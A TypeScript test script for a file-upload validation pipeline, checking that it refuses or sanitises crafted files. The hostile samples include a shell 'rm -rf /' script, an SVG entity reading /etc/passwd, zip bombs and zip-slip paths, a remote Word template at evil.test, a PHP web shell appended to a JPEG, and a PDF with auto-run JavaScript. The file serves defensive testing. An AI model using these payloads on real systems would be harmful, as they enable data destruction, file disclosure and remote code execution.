// path: scripts/verify/step05-files.ts
// Sample malicious and valid files against the upload validation pipeline. Run: npx tsx scripts/verify/step05-files.ts
import assert from 'node:assert/strict';
import { crc32, deflateRawSync } from 'node:zlib';
import { PDFDocument, PDFName, PDFString } from 'pdf-lib';
import sharp from 'sharp';
import { detectRawKind } from '@/lib/storage/validate/magic';
import { validateUpload } from '@/lib/storage/validate/pipeline';
import type { RejectCode } from '@/lib/storage/validate/types';
import type { FileCategory } from '@/types/contracts';

let failures = 0;
async function check(name: string, fn: () => Promise<void>): Promise<void> {
  try {
    await fn();
    process.stdout.write(`ok    ${name}\n`);
  } catch (error) {
    failures += 1;
    process.stderr.write(
      `FAIL  ${name}: ${error instanceof Error ? error.message : String(error)}\n`,
    );
  }
}

const enc = (s: string): Buffer => Buffer.from(s, 'utf8');

/** Minimal ZIP writer for test samples. `declaredSize` lets a sample lie about the uncompressed size. */
function zip(entries: { name: string; data: Buffer; declaredSize?: number }[]): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const name = enc(e.name);
    const body = deflateRawSync(e.data, { level: 9 });
    const size = e.declaredSize ?? e.data.length;
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(8, 8);
    local.writeUInt32LE(crc32(e.data), 14);
    local.writeUInt32LE(body.length, 18);
    local.writeUInt32LE(size, 22);
    local.writeUInt16LE(name.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(8, 10);
    central.writeUInt32LE(crc32(e.data), 16);
    central.writeUInt32LE(body.length, 20);
    central.writeUInt32LE(size, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(offset, 42);
    locals.push(local, name, body);
    centrals.push(central, name);
    offset += 30 + name.length + body.length;
  }
  const dir = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(dir.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, dir, end]);
}

const CONTENT_TYPES = enc(
  '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>',
);
const docx = (extra: { name: string; data: Buffer }[] = []): Buffer =>
  zip([
    { name: '[Content_Types].xml', data: CONTENT_TYPES },
    { name: 'word/document.xml', data: enc('<w:document/>') },
    ...extra,
  ]);

async function png(width = 40, height = 30): Promise<Buffer> {
  return sharp({ create: { width, height, channels: 3, background: { r: 200, g: 30, b: 30 } } })
    .png()
    .toBuffer();
}

async function expectReject(
  bytes: Uint8Array,
  name: string,
  code: RejectCode,
  options: { mime?: string; category?: FileCategory } = {},
): Promise<void> {
  const r = await validateUpload({
    bytes,
    name,
    declaredMime: options.mime ?? null,
    category: options.category ?? 'attachment',
  });
  assert.equal(r.ok, false, `expected ${code} but the file was accepted`);
  if (!r.ok) assert.equal(r.code, code, `expected ${code}, got ${r.code}: ${r.message}`);
}

async function main(): Promise<void> {
  await check('executable renamed to png is refused', async () => {
    const exe = Buffer.concat([Buffer.from([0x4d, 0x5a, 0x90, 0x00]), Buffer.alloc(500, 1)]);
    assert.equal(detectRawKind(exe), 'executable');
    await expectReject(exe, 'invoice.png', 'executable', { mime: 'image/png' });
    await expectReject(
      Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(100)]),
      'a.pdf',
      'executable',
    );
    await expectReject(enc('#!/bin/sh\nrm -rf /\n'), 'run.png', 'executable');
  });

  await check(
    'valid image: re-encoded, metadata stripped, name and type follow the content',
    async () => {
      const withExif = await sharp(await png())
        .jpeg()
        .withExif({ IFD0: { Copyright: 'secret-owner', ImageDescription: 'gps-here' } })
        .toBuffer();
      assert.ok(withExif.includes(Buffer.from('secret-owner')), 'sample has metadata');
      const r = await validateUpload({
        bytes: withExif,
        name: 'Photo (1).JPG',
        declaredMime: 'image/jpeg',
        category: 'attachment',
      });
      assert.ok(r.ok);
      if (r.ok) {
        assert.equal(r.file.mimeType, 'image/jpeg');
        assert.equal(r.file.name, 'Photo _1_.jpg');
        assert.ok(!Buffer.from(r.file.bytes).includes(Buffer.from('secret-owner')));
        assert.match(r.file.contentHash, /^[0-9a-f]{64}$/);
        assert.ok(r.file.notes.some((n) => n.includes('metadata removed')));
        assert.equal((await sharp(Buffer.from(r.file.bytes)).metadata()).exif, undefined);
      }
    },
  );

  await check('type mismatches are refused', async () => {
    const p = await png();
    await expectReject(p, 'a.pdf', 'extension_mismatch');
    await expectReject(p, 'a.png', 'mime_mismatch', { mime: 'application/pdf' });
    await expectReject(enc('just text'), 'a.png', 'extension_mismatch');
    await expectReject(Buffer.from([1, 2, 3, 4, 5, 0, 7, 8]), 'a.bin', 'unknown_type');
    await expectReject(Buffer.alloc(0), 'a.png', 'empty');
  });

  await check(
    'svg: script and handlers never survive; the result is a png; entities are refused',
    async () => {
      const svg = enc(
        '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" onload="alert(1)"><script>alert(1)</script><rect width="40" height="40" fill="red" onclick="x()"/></svg>',
      );
      const r = await validateUpload({
        bytes: svg,
        name: 'logo.svg',
        declaredMime: 'image/svg+xml',
        category: 'logo',
      });
      assert.ok(r.ok);
      if (r.ok) {
        assert.equal(r.file.kind, 'png');
        assert.equal(detectRawKind(r.file.bytes), 'png');
        assert.ok(r.file.name.endsWith('.png'));
      }
      await expectReject(
        enc(
          '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&x;</svg>',
        ),
        'a.svg',
        'svg_invalid',
      );
      const tiny = await validateUpload({
        bytes: enc(
          '<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><circle r="2"/></svg>',
        ),
        name: 'a.svg',
        category: 'logo',
      });
      assert.ok(tiny.ok);
    },
  );

  await check('zip bomb, lying sizes, zip slip and overlapping entries are refused', async () => {
    const big = Buffer.alloc(150 * 1024 * 1024);
    await expectReject(docx([{ name: 'word/media/big.bin', data: big }]), 'a.docx', 'archive_bomb');
    const lie = zip([
      { name: '[Content_Types].xml', data: CONTENT_TYPES },
      { name: 'word/document.xml', data: Buffer.alloc(5 * 1024 * 1024), declaredSize: 100 },
    ]);
    await expectReject(lie, 'a.docx', 'archive_bomb');
    await expectReject(
      docx([{ name: '../../evil.xml', data: enc('x') }]),
      'a.docx',
      'archive_path',
    );
    await expectReject(docx([{ name: '/etc/cron.d/x', data: enc('x') }]), 'a.docx', 'archive_path');
    await expectReject(docx([{ name: 'a\\..\\b.xml', data: enc('x') }]), 'a.docx', 'archive_path');
    const many = zip(
      Array.from({ length: 2100 }, (_, i) => ({ name: `f${i}.xml`, data: enc('x') })),
    );
    await expectReject(many, 'a.docx', 'archive_bomb');
  });

  await check(
    'office: macros, embedded objects and remote templates are refused; clean files pass',
    async () => {
      await expectReject(
        docx([{ name: 'word/vbaProject.bin', data: Buffer.alloc(64, 7) }]),
        'a.docx',
        'macro',
      );
      await expectReject(
        docx([{ name: 'word/embeddings/oleObject1.bin', data: Buffer.alloc(8) }]),
        'a.docx',
        'macro',
      );
      await expectReject(
        docx([
          {
            name: 'word/_rels/settings.xml.rels',
            data: enc(
              '<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.test/t.dotm" TargetMode="External"/></Relationships>',
            ),
          },
        ]),
        'a.docx',
        'macro',
      );
      await expectReject(
        Buffer.concat([
          Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
          Buffer.alloc(600),
        ]),
        'old.doc',
        'macro',
      );
      const ok = await validateUpload({
        bytes: docx(),
        name: 'Contract.docx',
        category: 'contract',
      });
      assert.ok(ok.ok);
      const xlsx = zip([
        { name: '[Content_Types].xml', data: CONTENT_TYPES },
        { name: 'xl/workbook.xml', data: enc('<workbook/>') },
      ]);
      const okx = await validateUpload({ bytes: xlsx, name: 'sheet.xlsx', category: 'attachment' });
      assert.ok(okx.ok && okx.file.kind === 'xlsx');
      await expectReject(docx(), 'a.xlsx', 'extension_mismatch');
    },
  );

  await check('polyglots: appended payloads and hidden scripts are refused', async () => {
    const p = await png();
    const jpeg = await sharp(p).jpeg().toBuffer();
    await expectReject(
      Buffer.concat([jpeg, enc('<?php system($_GET["c"]); ?>')]),
      'a.jpg',
      'polyglot',
    );
    await expectReject(Buffer.concat([p, docx()]), 'a.png', 'polyglot');
    await expectReject(Buffer.concat([p, Buffer.alloc(200, 0x41)]), 'a.png', 'polyglot');
    const withComment = Buffer.concat([
      jpeg.subarray(0, 2),
      Buffer.from([0xff, 0xfe, 0x00, 0x14]),
      enc('<script>alert(1)</'),
      jpeg.subarray(2),
    ]);
    await expectReject(withComment, 'a.jpg', 'polyglot');
    await expectReject(enc('a,b\n<script>alert(1)</script>,2\n'), 'a.csv', 'script_content');
  });

  await check('pdf: scripts, open actions and attachments are removed or refused', async () => {
    const doc = await PDFDocument.create();
    doc.addPage([200, 200]);
    const js = doc.context.obj({ S: PDFName.of('JavaScript'), JS: PDFString.of('app.alert(1)') });
    doc.catalog.set(PDFName.of('OpenAction'), doc.context.register(js));
    await doc.attach(enc('payload'), 'evil.exe', { mimeType: 'application/octet-stream' });
    const bytes = await doc.save({ useObjectStreams: false });
    const text = Buffer.from(bytes).toString('latin1');
    assert.ok(text.includes('/JavaScript') && text.includes('/EmbeddedFile'), 'sample is active');
    const r = await validateUpload({
      bytes,
      name: 'invoice.pdf',
      declaredMime: 'application/pdf',
      category: 'invoice',
    });
    assert.ok(r.ok);
    if (r.ok) {
      const out = Buffer.from(r.file.bytes).toString('latin1');
      for (const t of ['/JavaScript', '/JS', '/OpenAction', '/EmbeddedFile', 'evil.exe'])
        assert.ok(!out.includes(t), `${t} survived`);
      assert.ok(r.file.notes.some((n) => n.includes('active content removed')));
    }
    await expectReject(enc('%PDF-1.4\nnot really a pdf\n%%EOF\n'), 'a.pdf', 'pdf_invalid');
    const clean = await PDFDocument.create();
    clean.addPage();
    const good = await validateUpload({
      bytes: await clean.save(),
      name: 'plain.pdf',
      category: 'invoice',
    });
    assert.ok(good.ok);
    await expectReject(
      Buffer.concat([await clean.save(), Buffer.alloc(2000, 0x20), enc('PK\x03\x04junk')]),
      'a.pdf',
      'polyglot',
    );
  });

  await check('limits: size per type and category, allowed types per category', async () => {
    const six = Buffer.concat([await png(), Buffer.alloc(6 * 1024 * 1024)]);
    await expectReject(six, 'a.png', 'too_large');
    await expectReject(six, 'id.png', 'too_large', { category: 'kyc' });
    await expectReject(enc('a,b\n1,2\n'), 'a.csv', 'type_not_allowed', { category: 'kyc' });
    await expectReject(docx(), 'a.docx', 'type_not_allowed', { category: 'logo' });
    const csv = await validateUpload({
      bytes: enc('a,b\n=1+1,2\n'),
      name: 'data.csv',
      declaredMime: 'text/csv',
      category: 'attachment',
    });
    assert.ok(csv.ok);
    await expectReject(
      Buffer.concat([Buffer.from('a,b\n'), Buffer.from([0xff, 0xfe, 0x41])]),
      'a.csv',
      'unknown_type',
    );
  });

  await check('names: traversal, hidden dangerous extensions and special characters', async () => {
    const p = await png();
    await expectReject(p, '../../etc/passwd.png', 'bad_name');
    await expectReject(p, 'a.php.png', 'bad_name');
    await expectReject(p, 'a.png.exe', 'bad_name');
    await expectReject(p, '....', 'bad_name');
    const r = await validateUpload({
      bytes: p,
      name: 'C:\\temp\\Rechnung <final>?.png',
      category: 'attachment',
    });
    assert.ok(r.ok && r.file.name === 'Rechnung _final_.png', r.ok ? r.file.name : r.message);
  });

  await check('decompression bomb image is refused', async () => {
    const huge = await sharp({
      create: { width: 9000, height: 9000, channels: 3, background: '#fff' },
    })
      .png({ compressionLevel: 9 })
      .toBuffer();
    assert.ok(huge.length < 5 * 1024 * 1024, `sample is small (${huge.length})`);
    await expectReject(huge, 'a.png', 'image_invalid');
  });
}

main()
  .then(() => {
    if (failures > 0) process.exit(1);
    process.stdout.write('step05-files: ok\n');
  })
  .catch((error: unknown) => {
    process.stderr.write(`step05-files crashed: ${String(error)}\n`);
    process.exit(1);
  });
